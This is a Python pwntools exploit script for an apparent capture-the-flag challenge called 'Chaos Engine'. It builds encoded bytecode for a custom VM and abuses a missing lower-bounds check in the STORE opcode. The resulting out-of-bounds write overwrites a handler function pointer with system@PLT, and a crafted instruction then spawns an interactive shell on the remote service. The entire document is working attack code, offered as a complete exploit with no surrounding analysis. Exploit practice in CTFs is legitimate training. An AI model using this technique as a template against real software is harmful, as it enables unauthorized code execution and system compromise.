#!/usr/bin/env python3
"""
Chaos Engine - VM Exploit
Vulnerability: STORE opcode has no lower bounds check on memory offset,
allowing arbitrary write below the data memory base (0x4040e0).
We overwrite the function pointer table entry to point to system@PLT,
then trigger it with a pointer to "sh" string we placed in data memory.
"""
from pwn import *

context.log_level = 'info'
BINARY = "./chaos"
HOST, PORT = "chall.0xfun.org", 46191

def get_process():
    if args.REMOTE:
        return remote(HOST, PORT)
    elif args.GDB:
        return gdb.debug(BINARY, gdbscript='b *0x40165b\nc\n')
    else:
        return process(BINARY)

class ChaosVM:
    """Encoder/simulator for the Chaos VM bytecode"""
    def __init__(self):
        self.regs = [0] * 8
        self.key = 0x55
        self.bytecode = bytearray()
        self.instr_count = 0

    def _encode(self, b1, b2, b3):
        self.bytecode.extend([b1 ^ self.key, b2 ^ self.key, b3 ^ self.key])
        self.instr_count += 1

    def emit_SET(self, reg, val):
        """R[reg] = val (0-255)"""
        assert 0 <= reg <= 7 and 0 <= val <= 255
        self._encode(1, reg, val)
        self.regs[reg] = val
        self.key = (self.key + 0x13) & 0xFF

    def emit_ADD(self, dst, src):
        """R[dst] += R[src]; key ^= R[dst]&0xff"""
        assert 0 <= dst <= 7 and 0 <= src <= 7
        self._encode(2, dst, src)
        self.regs[dst] = (self.regs[dst] + self.regs[src]) & 0xFFFFFFFFFFFFFFFF
        self.key = (self.key ^ (self.regs[dst] & 0xFF)) & 0xFF
        self.key = (self.key + 0x13) & 0xFF

    def emit_STORE(self, val_reg, addr_reg):
        """MEM[0x4040e0 + R[addr_reg]] = R[val_reg]; key += 1"""
        assert 0 <= val_reg <= 7 and 0 <= addr_reg <= 7
        self._encode(5, val_reg, addr_reg)
        self.key = (self.key + 1) & 0xFF
        self.key = (self.key + 0x13) & 0xFF

    def emit_trigger(self, opcode, byte2, byte3=0):
        """Emit raw instruction to trigger a specific opcode"""
        # Find byte1 such that byte1 % 7 = opcode
        byte1 = opcode if opcode < 7 else opcode
        self._encode(byte1, byte2, byte3)

    def double(self, reg):
        """R[reg] *= 2 via ADD R,R"""
        self.emit_ADD(reg, reg)

    def get_hex(self):
        return self.bytecode.hex()


def exploit():
    vm = ChaosVM()

    # === Step 1: Write "sh\0" to data memory at offset 0 (addr 0x4040e0) ===
    # Build 0x6873 ("sh" little-endian) in R4
    vm.emit_SET(4, 0x73)    # R4 = 's'
    vm.emit_SET(5, 0x68)    # R5 = 'h'
    for _ in range(8):       # R5 <<= 8 → 0x6800
        vm.double(5)
    vm.emit_ADD(4, 5)        # R4 = 0x6873
    # Store to MEM[0]
    vm.emit_SET(5, 0)        # R5 = 0 (offset)
    vm.emit_STORE(4, 5)      # MEM[0x4040e0] = "sh\0..."

    # === Step 2: Build system@PLT (0x401090) in R2 ===
    vm.emit_SET(2, 0x90)     # R2 = 0x90
    vm.emit_SET(3, 0x10)     # R3 = 0x10
    for _ in range(8):       # R3 <<= 8 → 0x1000
        vm.double(3)
    vm.emit_ADD(2, 3)        # R2 = 0x1090
    vm.emit_SET(3, 0x40)     # R3 = 0x40
    for _ in range(16):      # R3 <<= 16 → 0x400000
        vm.double(3)
    vm.emit_ADD(2, 3)        # R2 = 0x401090

    # === Step 3: Build -0xC0 in R0 (offset to handler[0] at 0x404020) ===
    # -0xC0 = 0xFFFFFFFFFFFFFF40
    # Strategy: R0 = 0x40, then add 0xFF shifted left by 8,16,24,...,56
    vm.emit_SET(0, 0x40)     # R0 = 0x40
    vm.emit_SET(1, 0xFF)     # R1 = 0xFF
    for i in range(7):       # 7 iterations to fill bytes 1-7 with 0xFF
        for _ in range(8):   # R1 <<= 8
            vm.double(1)
        vm.emit_ADD(0, 1)    # R0 += R1

    log.info(f"R0 should be 0xFFFFFFFFFFFFFF40 = {vm.regs[0]:#018x}")
    assert vm.regs[0] == 0xFFFFFFFFFFFFFF40, f"R0 = {vm.regs[0]:#x}"

    # === Step 4: Overwrite handler[0] with system@PLT ===
    # STORE: MEM[0x4040e0 + R[0]] = R[2]
    # = MEM[0x4040e0 + (-0xC0)] = MEM[0x404020] = 0x401090
    vm.emit_STORE(2, 0)

    log.info(f"R2 (system@PLT) = {vm.regs[2]:#x}")
    assert vm.regs[2] == 0x401090, f"R2 = {vm.regs[2]:#x}"

    # === Step 5: Build address of "sh" string (0x4040e0) in R4 ===
    vm.emit_SET(4, 0xE0)     # R4 = 0xE0
    vm.emit_SET(5, 0x40)     # R5 = 0x40
    for _ in range(8):       # R5 <<= 8 → 0x4000
        vm.double(5)
    vm.emit_ADD(4, 5)        # R4 = 0x40E0
    vm.emit_SET(5, 0x40)     # R5 = 0x40
    for _ in range(16):      # R5 <<= 16 → 0x400000
        vm.double(5)
    vm.emit_ADD(4, 5)        # R4 = 0x4040E0

    log.info(f"R4 (sh addr) = {vm.regs[4]:#x}")
    assert vm.regs[4] == 0x4040e0, f"R4 = {vm.regs[4]:#x}"

    # === Step 6: Trigger overwritten handler[0] (now system) ===
    # byte1 = 7 (7%7=0 → handler[0] = system)
    # byte2 = 4 (R[4] = 0x4040e0 → rdi = address of "sh")
    vm.emit_trigger(7, 4, 0)

    log.info(f"Total instructions: {vm.instr_count}")
    log.info(f"Bytecode: {len(vm.bytecode)} bytes, hex: {len(vm.get_hex())} chars")

    # Send exploit
    io = get_process()
    io.recvuntil(b"Feed the chaos (Hex encoded): ")

    payload = vm.get_hex()
    io.sendline(payload.encode())

    import time
    time.sleep(0.5)
    log.success("Exploit sent! Shell spawned via system('sh')")

    # system("sh") gives us a shell - VM continues after it returns
    # so the shell stays alive as long as we keep stdin open
    io.interactive()

if __name__ == "__main__":
    exploit()
